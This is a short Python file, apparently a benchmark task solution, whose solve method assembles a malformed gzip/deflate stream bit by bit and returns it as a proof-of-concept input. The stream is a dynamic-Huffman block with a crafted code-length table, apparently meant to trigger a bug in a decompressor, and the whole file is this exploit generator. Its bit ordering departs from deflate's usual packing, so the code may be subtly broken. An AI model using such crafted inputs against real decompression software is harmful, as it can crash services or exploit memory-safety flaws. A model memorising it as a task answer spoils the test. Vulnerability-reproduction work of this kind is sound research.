class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        data = []
        buffer = 0
        count = 0

        def add_bit(b):
            nonlocal buffer, count
            buffer = (buffer << 1) | b
            count += 1
            if count == 8:
                data.append(buffer)
                buffer = 0
                count = 0

        # Block header: BFINAL=1, BTYPE=10 (dynamic), HLIT=0 (257), HDIST=0 (1), HCLEN=15 (19)
        add_bit(1)  # BFINAL
        add_bit(1)  # BTYPE msb
        add_bit(0)  # BTYPE lsb
        for _ in range(5):  # HLIT=0
            add_bit(0)
        for _ in range(5):  # HDIST=0
            add_bit(0)
        for _ in range(4):  # HCLEN=15
            add_bit(1)

        # CL code lengths (3 bits each, msb first)
        cl_lengths = [0] * 19
        cl_lengths[2] = 1  # symbol 18
        cl_lengths[18] = 2  # symbol 15
        for l in cl_lengths:
            for i in range(2, -1, -1):
                add_bit((l >> i) & 1)

        # Encoded lit/len and dist code lengths: two 18's for 258 zeros
        # Code for 18: 1
        add_bit(1)
        # Extra for first 18: 126 = 0b1111110
        extra1 = 126
        for i in range(6, -1, -1):
            add_bit((extra1 >> i) & 1)
        # Code for second 18: 1
        add_bit(1)
        # Extra for second 18: 110 = 0b1101110
        extra2 = 110
        for i in range(6, -1, -1):
            add_bit((extra2 >> i) & 1)

        # Flush remaining bits
        if count > 0:
            buffer <<= (8 - count)
            data.append(buffer)

        deflate_bytes = bytes(data)
        poc = header + deflate_bytes
        return poc
